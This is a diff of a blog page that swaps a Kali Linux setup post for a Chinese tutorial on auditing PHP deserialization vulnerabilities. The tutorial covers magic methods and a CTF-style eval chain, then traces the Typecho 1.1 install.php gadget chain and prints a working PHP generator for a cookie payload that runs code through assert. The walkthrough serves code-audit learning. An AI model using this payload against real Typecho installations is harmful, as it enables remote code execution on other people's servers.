@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="kali的基本配置, Youngboy,github">
+    <meta name="keywords" content="反序列化审计, Youngboy,github">
     <meta name="description" content="北冥有鱼，其名为鲲，鲲之大，不知其几千里也； 化而为鸟，其名为鹏.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>kali的基本配置 | Young&#39;s Blogs</title>
+    <title>反序列化审计 | Young&#39;s Blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -319,12 +319,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">kali的基本配置</h1>
+                    <h1 class="description center-align post-title">反序列化审计</h1>
                 </div>
             </div>
         </div>
@@ -449,8 +449,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/kali/" class="post-category">
-                                kali
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -462,28 +462,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-16
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-17
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    776
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    6 分
                 </div>
                 
 
@@ -499,48 +499,138 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-：vmware网络配置"><a href="#0x01-：vmware网络配置" class="headerlink" title="0x01 ：vmware网络配置"></a>0x01 ：vmware网络配置</h1><hr>
-<p>在有下角有个网络适配器<br><img src="https://img-blog.csdnimg.cn/20200317004057207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>点击一下就出现了虚拟机设置<br><img src="https://img-blog.csdnimg.cn/20200317004201978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_5,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_14,color_FFFFFF,t_60" alt="在这里插入图片描述"><br>虚拟机有三个网络配置<br><code>1</code>：桥接模式（虚拟机和主机在同一个网络环境下的两台电脑）<br><code>2</code>：NAT模式（虚拟机通过主机联网）<br><code>3</code>：主机模式（只能虚拟机和主机直接交互）<br>前面2个应该比较熟悉，而第三个，意思就是无法ping通外网，只能虚拟机和宿主机直接互相ping通</p>
-<h1 id="0x02：kali系统更新配置"><a href="#0x02：kali系统更新配置" class="headerlink" title="0x02：kali系统更新配置"></a>0x02：kali系统更新配置</h1><hr>
-<p>更新配置这里使用老版本的，新版本的以后在弄（新版本msf依赖下载好慢，不习惯）</p>
-<p>选择不更新 Metasploit<br><strong>1:</strong> 查看当前的系统中所有软件包状态</p>
-<p><code>sudo dbjg --get-selections | more</code><br>这时候可以找打软件包为 “metasploit-framework”<br><strong>2:</strong> 给metasploit-framework锁定当前版本不更新</p>
-<p><code>sudo apt-mark hold metasploit-framework</code><br><strong>3：</strong> 查看当前已锁定的软件包<br><code>sudo dbkg --get-selections | grep hold</code><br><strong>4:</strong> 取消软件保留设置</p>
-<p><code>sudo -apt-mark unhold metasploit-framework</code><br>但是一般情况下的话不会去锁定哒<del>~</del></p>
-<p><strong>kali系统更新后出现一些问题</strong><br>进入 <code>/usr/share/metasploit-framework</code> 目录下<br>使用命令</p>
-<p><code>gem install bundler</code><br><code>gem update --system</code><br>然后就可以成功的启动了，具体可以问度娘的~~</p>
-<h3 id="一、配置kali系统源"><a href="#一、配置kali系统源" class="headerlink" title="一、配置kali系统源"></a>一、配置kali系统源</h3><p><strong>1.</strong> 使用编辑器打开系统源文本<br><code>leafpad /etc/apt/aources.list</code></p>
-<p><strong>2.</strong> 填写源</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#中科大</span>
-deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-<span class="token comment" spellcheck="true">#阿里云</span>
-deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-<span class="token comment" spellcheck="true">#清华大学</span>
-deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-<span class="token comment" spellcheck="true">#163</span>
-deb http://mirrors.163.com/debian wheezy main non-free contrib
-deb-src http://mirrors.163.com/debian wheezy main non-free contrib
-deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
-deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
-deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
-<span class="token comment" spellcheck="true">#东软大学</span>
-deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
-deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
-<span class="token comment" spellcheck="true">#官方源</span>
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre>
-<p>任意选一个就好了，可以选清华，或者中科大</p>
-<p><strong>3.</strong> 使用更新命令</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> upgrade <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> dist-upgrade</code></pre>
-<h1 id="0x03：kali配置ssh服务"><a href="#0x03：kali配置ssh服务" class="headerlink" title="0x03：kali配置ssh服务"></a>0x03：kali配置ssh服务</h1><ol>
-<li>开启ss服务</li>
-</ol>
-<p><code>service ssh start</code><br>2. 查看ssh服务状态</p>
-<p><code>service ssh status</code><br>3. 关闭ssh服务</p>
-<p><code>service ssh stop</code><br>步骤：<br>先是打开ssh服务，然后ifconfig查看虚拟机ip<br><img src="https://img-blog.csdnimg.cn/20200317011416793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以填主机，协议要选ssh<br>名称随意<br><img src="https://img-blog.csdnimg.cn/20200317011558319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后会提示我们输入用户名，就是虚拟机用户名<br>root （我的是root）<br>填写完后会要求我们输入密码<br><img src="https://img-blog.csdnimg.cn/20200317011712365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入你自己虚拟机的密码既可<br>然后点击记住密码，下次就可以直接登录了<br><img src="https://img-blog.csdnimg.cn/20200317011804574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个标志就说明成功了。啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦</p>
+                <h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全<br>PHP反序列化漏洞，在我们使用<code>unserialize()</code>进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。</p>
+<h1 id="0x01-初识反序列化"><a href="#0x01-初识反序列化" class="headerlink" title="0x01 初识反序列化"></a>0x01 初识反序列化</h1><p>反序列化我们需要了解php的类和魔术方法，这里举个简单的例子用到的魔术方法是<code>__destruct</code> 销毁一个类之前执行执行析构方法。</p>
+<p><img src="/2020/040118672.htm/1.9.1.png" alt="file"></p>
+<p>当对象创建后输出我们的<code>$a</code>变量的值。那么我们把它的值改变后用<code>serialize()</code>看看</p>
+<p><img src="/2020/040118672.htm/1.9.2.png" alt="file"></p>
+<p><code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;12345&quot;;}</code> 是我们序列化的值，然后<code>unserialize($_GET[&#39;id&#39;]);</code>传入我们改变的值 <code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;404&quot;;}</code> 成功打印了我们的改变的值，因为反序列化我们可以控制类属性且这个过程会触发这些能够触发的魔术方法。</p>
+<p>这里网上可以找到一些魔术方法,当然还有些可以绕过具体大家搜索一下我这里就不细写了，具体情况具体分析，反序列化难一点的还是需要很大的耐心才能完成。</p>
+<pre><code>__wakeup() //使用unserialize时触发
+__sleep() //使用serialize时触发
+__destruct() //对象被销毁时触发
+__call() //在对象上下文中调用不可访问的方法时触发
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+__toString() //把类当作字符串使用时触发
+__invoke() //当脚本尝试将对象调用为函数时触发
+</code></pre><h1 id="0x02-简单的一道题"><a href="#0x02-简单的一道题" class="headerlink" title="0x02 简单的一道题"></a>0x02 简单的一道题</h1><p>下面我改了写一道简单的CTF，看看怎么利用它。</p>
+<pre><code>&lt;?php
+
+class foo1{
+    public $varr;
+    function __destruct(){
+        $this-&gt;varr-&gt;evaltest();
+    }
+}
+
+class foo2{
+    public $str;
+    function evaltest(){
+        eval($this-&gt;str);
+    }
+}
+?&gt;
+</code></pre><p>我们看到在foo2中<code>evaltest()</code>函数中存在eval，而foo1中调用了函数<code>evaltest()</code>，我们就想可不可以让foo1调用foo2中的<code>evaltest()</code>函数顺边还把它的<code>$str</code>中的值改写了。</p>
+<pre><code>&lt;?php
+class foo1{
+    public $varr;
+    function __construct(){
+        $this-&gt;varr = new foo2();
+    }
+}
+
+class foo2{
+    public $str;
+    function __construct(){
+        $this-&gt;str = &#39;phpinfo();&#39;;
+  }
+}
+
+$obj = new foo1();
+echo serialize($obj); 
+?&gt;</code></pre><p>我们把<code>$varr</code>变量赋值为<code>new foo2()</code> 然后它再去调用 <code>evaltest()</code>函数 然后我们把<code>$str</code>的值换成 我们想执行的命令。</p>
+<p><img src="/2020/040118672.htm/1.9.3.png" alt="file"></p>
+<h1 id="0x03-实例审计"><a href="#0x03-实例审计" class="headerlink" title="0x03 实例审计"></a>0x03 实例审计</h1><p>找了半天源码我觉得最有意义的，审计的最多的一次反序列化当属Typecho1.1版本的漏洞了。可能看起来有点吃力我尽量分析的详细一点。</p>
+<p>来到文件 <code>install.php</code></p>
+<p><img src="/2020/040118672.htm/1.9.4.png" alt="file"></p>
+<p>我们看到要绕过<code>install.php</code>这个程序的<code>exit</code> 我们只需要传入的<code>finish</code>值不为空且<code>referer</code>为本站的值就能绕过。</p>
+<p>我们来到核心部分</p>
+<p><img src="/2020/040118672.htm/1.9.5.png" alt="file"></p>
+<p>这里调用<code>Typecho_Cookie</code>类的<code>get</code>方法 ，我这里就不跟进去了，就是获取cookies的<code>__typecho_config</code> 字段值，然后<code>base64_decode()</code>在进行反序例化赋值给变量<code>$config</code>,然后我们全局搜索下魔术方法<code>__destruct</code>之类的发现没有可以利用的点.</p>
+<p><img src="/2020/040118672.htm/1.9.7.png" alt="file"></p>
+<p>然后我们跟进这个<code>Typecho_Db</code>类看看，他传入了<code>$config[&#39;adapter&#39;]</code> 和 <code>$config[&#39;prefix&#39;]</code>。</p>
+<p>var\Typecho\Db.php</p>
+<p><img src="/2020/040118672.htm/1.9.6.png" alt="file"></p>
+<p>这里使用<code>.</code>连接<code>$adapterName</code>为一个类的话那么会触发<code>__toString()</code>这个魔术方法。</p>
+<p><img src="/2020/040118672.htm/1.9.8.png" alt="file"></p>
+<p>然后全局搜索<code>__toString()</code>,来看看那里可以利，找到<code>\var\Typecho\Feed.php</code>。</p>
+<p><img src="/2020/040118672.htm/1.9.9.png" alt="file"></p>
+<p>如果<code>$item[&#39;author&#39;]</code>是一个类且<code>screenName</code>是一个私有或者未定义的属性那么就会自动触发<code>__get()</code></p>
+<p><img src="/2020/040118672.htm/1.9.10.png" alt="file"></p>
+<p>那么我们就搜索看看那里有可以利用的<code>__get()</code></p>
+<p>在var\Typecho\Request.php 有这么一处</p>
+<p><img src="/2020/040118672.htm/1.9.11.png" alt="file"></p>
+<p>我把跟进的代码都放在了一块，其中__get 调用了 <code>get()</code>函数，然后它又调用了<code>_applyFilter()</code>函数，其中还有可以造成命令执行的回调函数<code>call_user_func()</code>和<code>array_map()</code> 其中参数还可以控制，那么我的攻击链也算找完了，下面来梳理一下</p>
+<p>攻击链：</p>
+<pre><code>install.php
+        |
+绕过程序退出来到unserialize()
+        |
+db.php中__construct() 触发__toString()
+        |
+Feed.php中__toString触发__get()
+        |
+request.php中__get()调用get()-&gt;_applyFilter()-&gt;回调函数
+</code></pre><p>下面来构造exp，为了方便理解我们可以从尾到头来写</p>
+<p>首先我们需要<code>_applyFilter</code>中的<code>$filter</code>的值为一个命令函数这里一般选择<code>assert()</code>,然后要让<code>get()</code>中的<code>$value</code>就是我们传入的命令也就是<code>_params[&#39;screenName&#39;]</code>，所以可以构造如下。</p>
+<pre><code>class Typecho_Request
+{
+    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);
+    private $_filter = array(&#39;assert&#39;);
+
+}
+</code></pre><p><code>request.php</code>构造完了再构造<code>Feed.php</code>中需要的值,这里我们要进入<code>$item[&#39;author&#39;]-&gt;screenName</code>这个前面有个<code>self::RSS2 == $this-&gt;_type</code>语句 RSS2= RSS 2.0所以赋值对应的，这里的调用跟我前面写的那个CTF类似。</p>
+<pre><code>class  Typecho_Feed
+{   
+    private $_type = &#39;RSS 2.0&#39;;
+    private $_items ;   
+
+    public function __construct (){
+        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());
+    }
+}
+</code></pre><p>最后回到<code>install.php中</code> 看到<code>$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code> 触发<code>db.php</code>中的<code>__construct()</code>需要传入2个值，但是有个是默认的所以我们传入一个我们序列化的上面的值就可以了。</p>
+<p>payload :</p>
+<pre><code>&lt;?php
+
+class Typecho_Request
+{
+    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);
+    private $_filter = array(&#39;assert&#39;);
+
+}
+
+class  Typecho_Feed
+{   
+    private $_type = &#39;RSS 2.0&#39;;
+    private $_items ;   
+
+    public function __construct (){
+        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());
+    }
+}
+
+$payload = array(&#39;adapter&#39;=&gt;new Typecho_Feed());
+echo base64_encode(serialize($payload));
+?&gt;
+</code></pre><p>为什么这里payload <code>phpinfo();exit();</code>中有<code>exit()</code> ,因为程序开始使用了<code>ob_start()</code> 这个函数会把输出放进缓冲区，触发异常后<code>ob_end_clean()</code> 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。</p>
+<p><img src="/2020/040118672.htm/1.9.12.png" alt="file"></p>
+<p>这类反序列化一般寻找起来还是很有难度的，个人感觉两头向中间来找方便一些，找到可以利用的入口，再到可以利用的函数，再从入口点想办法到利用点。</p>
+<h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>反序列化的地方还可以搭配注入 比如espcms的search.php注入。</p>
 
             </div>
             <hr/>
@@ -566,7 +656,7 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://youngscript.github.io/2020/031611755.html">http://youngscript.github.io/2020/031611755.html</a>
+                    <a href="http://youngscript.github.io/2020/040118672.html">http://youngscript.github.io/2020/040118672.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1034,34 +1124,32 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/031626401.html">
+                <a href="/2020/040134002.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="SQL注入审计">
                         
-                        <span class="card-title">SQL注入</span>
+                        <span class="card-title">SQL注入审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言——————————————————————————————————————
-这是我之前发布到的其他的一个网址，这里的话我重新总结
-可能分很多，我也不是很清楚，只是皮毛的研究了一下
-1，sql按数据库分的话，常用的有：MySQL，acc
+                            0x00 简介本文章来自 公众号：404安全
+为什么第一章我们学习，因为看这篇文章的朋友大概也看过我前面写的MySQL_wiki系列，这里来SQL注入的话我们能方便理解，同时sql注入也是审计中我们经常想要找到的，比较以来就getshell
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL/" class="post-category">
-                                    SQL
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
@@ -1078,32 +1166,33 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/031665118.html">
+                <a href="/2020/040121312.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="2020版本kali安装">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="通读全文审计">
                         
-                        <span class="card-title">2020版本kali安装</span>
+                        <span class="card-title">通读全文审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言——————————————————————————————————————总所周知，这个最新版本的变化很大（其实就是桌面变化大）其实嘞，物竞天择，随时代潮流。我刚好想试一试，那么就安装一个最新版本的，kali 2020.1
-正文第一步
+                            0x00 简介本文章来自 公众号：404安全
+通读全文推荐大家开始可以审计一些比较好看懂的CMS，我们先看大体网站框架，这里你大概知道什么文件夹是放什么类型的文件，然后从index.php文件开始往里面读,然后重点关注是否有全局过滤等等。
+
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/kali/" class="post-category">
-                                    kali
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
